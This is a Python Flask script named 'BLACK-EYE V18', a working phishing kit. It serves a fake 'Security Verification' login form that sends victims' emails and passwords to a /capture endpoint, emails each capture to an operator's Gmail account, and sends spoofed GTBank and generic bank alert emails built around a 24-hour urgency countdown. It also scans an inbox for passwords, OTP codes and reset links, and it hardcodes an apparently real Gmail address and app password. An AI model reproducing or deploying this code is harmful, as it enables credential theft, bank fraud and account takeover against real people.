#!/usr/bin/env python3
"""
BLACK-EYE V18.0 - RENDER.COM DEPLOYMENT
================================================================
✅ Cloud-Ready Phishing System
✅ Email Scanner & Intelligence
✅ Auto Report Generation
✅ Device Fingerprinting & Geolocation
✅ Advanced Password Extraction
✅ Smart Timing for Peak Hours
================================================================
"""
import os, time, threading, requests, smtplib, re, json, imaplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
from flask import Flask, request, jsonify, render_template_string
import hashlib

# ============ CONFIGURATION ============
PORT = int(os.environ.get("PORT", 10000))

# Email Configuration from Environment Variables
EMAIL_TO = os.getenv('EMAIL_TO', 'felixkoskey278@gmail.com')
EMAIL_FROM = os.getenv('EMAIL_FROM', 'felixkoskey278@gmail.com')
EMAIL_PASS = os.getenv('EMAIL_APP_PASSWORD', 'ntsu adxv tfgw ptpj')

# IMAP Configuration
IMAP_SERVER = "imap.gmail.com"
IMAP_PORT = 993
ENABLE_EMAIL_SCANNING = True

# Intelligence Configuration
ENABLE_DEEP_INTELLIGENCE = True
ENABLE_AUTO_REPORTS = True
REPORT_INTERVAL_MINUTES = 30

# Peak Hours for Maximum Phone Popup
PEAK_HOURS = {
    'morning': (7, 9),
    'lunch': (12, 13),
    'evening': (17, 19),
    'night': (21, 22)
}

ENABLE_SMART_TIMING = True
SEND_FOLLOW_UP = True
FOLLOW_UP_DELAY_HOURS = 2

# ============ FLASK APP ============
app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============ STORAGE ============
captures_db = []
intel_data = {
    'total_captures': 0,
    'unique_ips': set(),
    'unique_emails': set(),
    'session_start': datetime.now()
}

# ============ EMAIL PASSWORD EXTRACTOR ============
class EmailPasswordExtractor:
    def __init__(self, email_addr, app_password):
        self.email = email_addr
        self.password = app_password
        self.patterns = {
            'password': [
                r'password[:\s]+([^\s\n]+)',
                r'pass[:\s]+([^\s\n]+)',
                r'pwd[:\s]+([^\s\n]+)',
                r'pin[:\s]+(\d{4,6})',
                r'otp[:\s]+(\d{4,8})',
                r'code[:\s]+(\d{4,8})',
            ],
            'credentials': [
                r'username[:\s]+([^\s\n]+)',
                r'email[:\s]+([^\s\n@]+@[^\s\n]+)',
            ],
            'reset_links': [
                r'(https?://[^\s]+reset[^\s]*)',
                r'(https?://[^\s]+password[^\s]*)',
            ]
        }
        self.extracted_data = []
    
    def connect(self):
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            mail.login(self.email, self.password)
            return mail
        except Exception as e:
            print(f"❌ IMAP Connection Failed: {e}")
            return None
    
    def decode_subject(self, subject):
        if subject is None:
            return "No Subject"
        decoded = decode_header(subject)
        result = ""
        for part, encoding in decoded:
            if isinstance(part, bytes):
                result += part.decode(encoding or 'utf-8', errors='ignore')
            else:
                result += str(part)
        return result
    
    def extract_body(self, message):
        body = ""
        if message.is_multipart():
            for part in message.walk():
                if part.get_content_type() == "text/plain":
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        return body
    
    def scan_emails(self, num_emails=50):
        mail = self.connect()
        if not mail:
            return []
        
        try:
            mail.select('INBOX', readonly=True)
            status, messages = mail.search(None, 'ALL')
            
            if status != 'OK':
                return []
            
            email_ids = messages[0].split()
            recent_ids = email_ids[-num_emails:] if len(email_ids) >= num_emails else email_ids
            recent_ids.reverse()
            
            print(f"📧 Scanning {len(recent_ids)} emails...")
            
            for email_id in recent_ids:
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    message = email.message_from_bytes(msg_data[0][1])
                    subject = self.decode_subject(message.get('Subject'))
                    body = self.extract_body(message)
                    
                    full_text = f"{subject}\n{body}"
                    
                    found = {}
                    for category, patterns in self.patterns.items():
                        matches = []
                        for pattern in patterns:
                            matches.extend(re.findall(pattern, full_text, re.IGNORECASE))
                        if matches:
                            found[category] = list(set(matches))
                    
                    if found:
                        self.extracted_data.append({
                            'from': message.get('From'),
                            'subject': subject,
                            'date': message.get('Date'),
                            'extracted': found
                        })
                except:
                    continue
            
            mail.logout()
            return self.extracted_data
        except Exception as e:
            print(f"❌ Scan Error: {e}")
            return []

# ============ CAPTURE HANDLER ============
def handle_capture(data, ip=None, user_agent=None):
    global intel_data
    
    capture = {
        'timestamp': datetime.now().isoformat(),
        'data': data,
        'ip': ip or 'Unknown',
        'user_agent': user_agent
    }
    
    captures_db.append(capture)
    intel_data['total_captures'] += 1
    
    if ip:
        intel_data['unique_ips'].add(ip)
    
    # Extract email
    for key in ['email', 'identifier', 'loginfmt', 'account_name']:
        if key in data and '@' in str(data.get(key, '')):
            intel_data['unique_emails'].add(data[key])
            break
    
    # Send notification
    try:
        notification = f"""🎯 NEW CAPTURE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

IP: {ip or 'Unknown'}
User-Agent: {user_agent or 'Unknown'}

Data:
{chr(10).join([f"  {k}: {v}" for k, v in data.items()])}

Total Captures: {intel_data['total_captures']}
"""
        
        msg = MIMEText(notification, 'plain')
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        msg['Subject'] = f"🎯 NEW CAPTURE - {datetime.now().strftime('%H:%M:%S')}"
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        srv.starttls()
        srv.login(EMAIL_FROM, EMAIL_PASS)
        srv.send_message(msg)
        srv.quit()
        
        print(f"✅ Notification sent!")
    except Exception as e:
        print(f"⚠️ Notification failed: {e}")

# ============ EMAIL SENDER ============
def send_phishing_email(victim, phish_url, bank_type="gtbank"):
    # Bank-specific templates
    if bank_type.lower() == "gtbank":
        subject = "🚨 URGENT: GTBank Account Security Alert - Verify Within 24 Hours 🚨"
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#f5f5f5">
    <div style="max-width:600px;margin:0 auto;background:#fff">
        <div style="background:linear-gradient(135deg,#FF6B00,#FF8C00);padding:30px;text-align:center">
            <h1 style="color:#fff;margin:0;font-size:28px">🚨 CRITICAL SECURITY ALERT 🚨</h1>
        </div>
        <div style="padding:40px 30px">
            <div style="background:#fff3cd;border-left:5px solid #ff0000;padding:20px;margin:25px 0">
                <h2 style="color:#ff0000;margin:0 0 15px 0">⚠️ SUSPICIOUS ACTIVITY DETECTED</h2>
                <p>Your GTBank account requires immediate verification.</p>
            </div>
            <div style="background:#ff0000;color:#fff;padding:20px;text-align:center;border-radius:8px;margin:25px 0">
                <h3 style="margin:0 0 10px 0">⏰ TIME REMAINING</h3>
                <div style="font-size:42px;font-weight:700">24 HOURS</div>
            </div>
            <div style="text-align:center;margin:35px 0">
                <a href="{phish_url}" style="display:inline-block;background:#ff0000;color:#fff;padding:18px 50px;text-decoration:none;border-radius:50px;font-weight:700;font-size:18px">🔐 VERIFY ACCOUNT NOW</a>
            </div>
            <p style="text-align:center;color:#666;margin:25px 0">
                Failure to verify will result in account suspension.
            </p>
        </div>
        <div style="background:#2c3e50;color:#fff;padding:25px;text-align:center;font-size:12px">
            <p><strong>Guaranty Trust Bank Plc</strong></p>
            <p>Plot 1669, Oyin Jolayemi Street, Victoria Island, Lagos</p>
        </div>
    </div>
</body>
</html>'''
    else:
        subject = f"🚨 {bank_type.upper()}: Urgent Security Verification Required 🚨"
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#f4f4f4">
    <div style="max-width:600px;margin:0 auto;background:#fff">
        <div style="background:#ff0000;padding:30px;text-align:center">
            <h1 style="color:#fff;margin:0">🚨 SECURITY ALERT 🚨</h1>
        </div>
        <div style="padding:35px 25px">
            <div style="background:#ffebee;border-left:6px solid #ff0000;padding:25px;margin:20px 0">
                <h2 style="color:#ff0000;margin:0 0 15px 0">⚠️ IMMEDIATE ACTION REQUIRED</h2>
                <p>Your account requires urgent verification.</p>
            </div>
            <div style="text-align:center;margin:35px 0">
                <a href="{phish_url}" style="display:inline-block;background:#ff0000;color:#fff;padding:20px 55px;text-decoration:none;border-radius:50px;font-weight:700;font-size:19px">VERIFY NOW</a>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    try:
        msg = MIMEMultipart('alternative')
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['From'] = formataddr((f'{bank_type.upper()} Security', EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subject
        msg['X-Priority'] = '1'
        
        msg.attach(MIMEText(html, 'html', 'utf-8'))
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
        srv.starttls()
        srv.login(EMAIL_FROM, EMAIL_PASS)
        srv.send_message(msg)
        srv.quit()
        
        print(f"✅ Email sent to {victim}")
        return True
    except Exception as e:
        print(f"❌ Email failed: {e}")
        return False

# ============ FLASK ROUTES ============

@app.route('/')
def home():
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 15px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #1765cc; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Verification</h1>
        <form onsubmit="event.preventDefault();fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('e').value,password:document.getElementById('p').value})}).then(()=>location.href='https://google.com')">
            <input type="email" id="e" placeholder="Email address" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>''')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json() or request.form.to_dict()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent')
        
        handle_capture(data, ip, ua)
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Capture error: {e}")
        return jsonify({'success': False}), 400

@app.route('/send-email', methods=['POST'])
def send_email_route():
    try:
        data = request.get_json()
        victim = data.get('email')
        bank = data.get('bank', 'gtbank')
        
        if not victim:
            return jsonify({'error': 'Email required'}), 400
        
        phish_url = f"{request.url_root}"
        success = send_phishing_email(victim, phish_url, bank)
        
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/scan-emails', methods=['POST'])
def scan_emails_route():
    try:
        extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
        results = extractor.scan_emails(num_emails=50)
        
        return jsonify({
            'success': True,
            'results': results,
            'count': len(results)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def stats():
    return jsonify({
        'total_captures': intel_data['total_captures'],
        'unique_ips': len(intel_data['unique_ips']),
        'unique_emails': len(intel_data['unique_emails']),
        'session_duration': str(datetime.now() - intel_data['session_start']),
        'recent_captures': captures_db[-10:]
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

# ============ BACKGROUND TASKS ============
def email_scanner_task():
    while True:
        try:
            time.sleep(3600)  # Every hour
            print("🔍 Running email scan...")
            
            extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
            results = extractor.scan_emails(num_emails=100)
            
            if results:
                # Send report
                report = f"Email Scan Report - {len(results)} findings\n\n"
                for r in results:
                    report += f"From: {r['from']}\nSubject: {r['subject']}\nFindings: {r['extracted']}\n\n"
                
                msg = MIMEText(report, 'plain')
                msg['From'] = EMAIL_FROM
                msg['To'] = EMAIL_TO
                msg['Subject'] = f"🔍 Email Scan - {len(results)} Findings"
                
                srv = smtplib.SMTP('smtp.gmail.com', 587)
                srv.starttls()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"✅ Email scan complete: {len(results)} findings")
        except Exception as e:
            print(f"Email scanner error: {e}")

# ============ MAIN ============
if __name__ == '__main__':
    print("\n" + "="*70)
    print("BLACK-EYE V18 - RENDER.COM DEPLOYMENT")
    print("="*70)
    print(f"Port: {PORT}")
    print(f"Email: {EMAIL_TO}")
    print("="*70 + "\n")
    
    # Start background tasks
    if ENABLE_EMAIL_SCANNING:
        threading.Thread(target=email_scanner_task, daemon=True).start()
        print("✅ Email scanner started")
    
    # Run Flask app
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
